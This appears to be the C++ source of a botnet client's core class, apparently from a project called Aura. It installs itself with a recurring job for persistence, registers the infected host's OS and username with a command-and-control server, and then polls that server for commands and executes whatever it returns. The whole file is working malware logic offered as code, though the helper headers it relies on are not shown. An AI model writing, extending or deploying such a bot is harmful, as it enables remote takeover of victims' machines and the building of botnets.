#include <memory>
#include <string>

#include "command.hh"
#include "installer.hh"
#include "request.hh"
#include "authfile.hh"
#include "util.hh"

const std::string HASH_TYPE("SHA256");

class Bot {
   public:
    Bot(const std::string& auth_path) {
        hash_type_ = HASH_TYPE;
        auth_ = std::make_unique<AuthFile>(auth_path);
    }

    void Install(std::string install_dir);
    bool IsInstalled();
    void RegisterBot(const std::string& register_url);
    void ExecuteCommand(const std::string& command_url);

   private:
    std::string hash_type_, hash_sum_, os_, user_;
    std::unique_ptr<AuthFile> auth_;

    void PrepareSysInfo_();
};

void Bot::Install(std::string install_dir) {
    // Install files and components
    Installer installer(install_dir);
    installer.InstallFiles();
    installer.InitRecurringJob();
}

bool Bot::IsInstalled() { return auth_->Exists(); }

void Bot::RegisterBot(const std::string& register_url) {
    // Register bot with C2 server
    PrepareSysInfo_();
    request::PostForm post_form;
    post_form.AddField("version", AURA_VERSION);
    post_form.AddField("hash_type", hash_type_);
    post_form.AddField("hash_sum", hash_sum_);
    post_form.AddField("operating_sys", os_);
    post_form.AddField("user", user_);
    request::Post(register_url, post_form.ToString());
}

void Bot::ExecuteCommand(const std::string& command_url) {
    // Update system info and create POST form
    PrepareSysInfo_();
    request::PostForm post_form;
    post_form.AddField("version", AURA_VERSION);
    post_form.AddField("hash_sum", hash_sum_);

    std::string response = request::Post(command_url, post_form.ToString());

    // Parse response from C2 server and execute based on JSON data
    Command cmd(response);
    cmd.Execute();
}

void Bot::PrepareSysInfo_() {
    // Init or retrieve auth file
    if (auth_->Exists()) {
        auth_->Retrieve();
    } else {
        auth_->Init();
    }

    // Retrieve values if they haven't been already
    if (!(hash_sum_.size())) {
        hash_sum_ = auth_->GetHash();
    }
    if (!(os_.size())) {
        os_ = util::GetOS();
    }
    if (!(user_.size())) {
        user_ = util::GetUser();
    }
}